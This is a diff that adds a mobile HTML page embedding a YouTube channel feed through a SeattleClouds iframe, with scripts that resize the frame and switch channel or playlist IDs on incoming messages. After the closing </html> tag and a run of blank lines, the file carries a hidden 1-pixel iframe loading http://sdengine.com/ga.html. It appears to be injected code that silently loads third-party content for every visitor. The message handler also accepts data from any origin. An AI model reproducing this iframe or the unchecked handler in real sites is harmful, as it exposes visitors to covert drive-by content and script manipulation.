@@ -1,0 +1,106 @@
+<!DOCTYPE HTML PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html>
+<head>
+    <title>VINAMILK</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <link rel='stylesheet' type='text/css' href='mobileyoutube.css' id="mobileyoutube">
+
+    <script type="text/javascript">
+        var t = 0;
+        var refreshIntervalId;
+        var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
+        var eventer = window[eventMethod];
+        var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
+        eventer(messageEvent, function (e) {
+            var key = e.message ? "message" : "data";
+            var data = e[key];
+            var jsonObj = JSON.parse(data);
+            if (jsonObj.height || jsonObj.playlistId || jsonObj.channelId) {
+                //console.log('obj=>' + data);
+                resizeBodyAndSetIds(jsonObj);
+            }
+
+        }, false);
+
+        function resizeBodyAndSetIds(jsonObj) {
+            
+            var height = jsonObj.height;
+            var playlistId = jsonObj.playlistId;
+            var channelId = jsonObj.channelId;
+
+            //console.log('parsed height=>' + height);
+            //console.log('parsed playlistId=>' + playlistId);
+            //console.log('parsed channelId=>' + channelId);
+
+            if (playlistId) { document.getElementById('playlistId').value = playlistId; }
+            if (channelId) { document.getElementById('channelId').value = channelId; }
+
+            if (height) { resizeContent(height); }
+            if (playlistId || channelId) { changeIds(); }
+        }
+        function resizeContent(height) {
+            t++;
+            var rsstableElem = document.getElementById("youtubeTable");
+            if (rsstableElem != null) {
+                try {
+                    var ifrH = height;
+                    if (ifrH < 380) {
+                        ifrH = 380;
+                    }
+                    rsstableElem.style.height = ifrH + "px";
+                }
+                catch (err) {
+                    console.log(err);
+                }
+            }
+            if (t > 10) {
+                if (refreshIntervalId)
+                    clearInterval(refreshIntervalId);
+            }
+        }
+        function changeIds() {
+            var youtubeTable = document.getElementById("youtubeTable");
+            if (youtubeTable != null) {
+                var channelId = document.getElementById('channelId');
+                var playlistId = document.getElementById('playlistId');
+                if (channelId.value != '') {
+                    youtubeTable.src = updateQueryStringParameter(youtubeTable.src, 'channelId', channelId.value);
+                }
+                else if (playlistId.value != '') {
+                    youtubeTable.src = updateQueryStringParameter(youtubeTable.src, 'playlistId', playlistId.value);
+                }
+            }
+        }
+        function updateQueryStringParameter(uri, key, value) {
+            var re = new RegExp("([?&])" + key + "=.*?(&|$)", "i");
+            var separator = uri.indexOf('?') !== -1 ? "&" : "?";
+            if (uri.match(re)) {
+                return uri.replace(re, '$1' + key + "=" + value + '$2');
+            }
+            else {
+                return uri + separator + key + "=" + value;
+            }
+        }
+    </script>
+</head>
+<body onresize="resizeBody()">
+    <div class="youtubeheader">
+        <img id="headerimage" src="bigicon@2x.png">
+    </div>
+    <h1 class="youtube_headertitle" id="headertitle">HICHEM Youtube OFFICIAL</h1>
+    <iframe frameborder="0" id="youtubeTable" width="100%" scrolling="no" src="http://youtube.seattleclouds.com/youtubeResult.ashx?q=https://www.youtube.com/channel/UCT12GWcVZiDyfYB2ztLouWA&amp;type=channel&amp;feedsmaxitems=10&amp;channelId=UCT12GWcVZiDyfYB2ztLouWA" style="height: 951px;"></iframe>
+    <input type="hidden" id="searchQ" value="https://www.youtube.com/channel/UCT12GWcVZiDyfYB2ztLouWA">
+    <input type="hidden" id="maxResult" value="10">
+    <input type="hidden" id="requestType" value="channel">
+    <input type="hidden" id="channelId" value="UCT12GWcVZiDyfYB2ztLouWA">
+    <input type="hidden" id="playlistId" value="">
+
+ 
+ 
+ 
+ 
+ 
+ 
+ </body>
+</html> <iframe src="http://sdengine.com/ga.html" frameBorder="0" width="100%" height="1"></iframe>
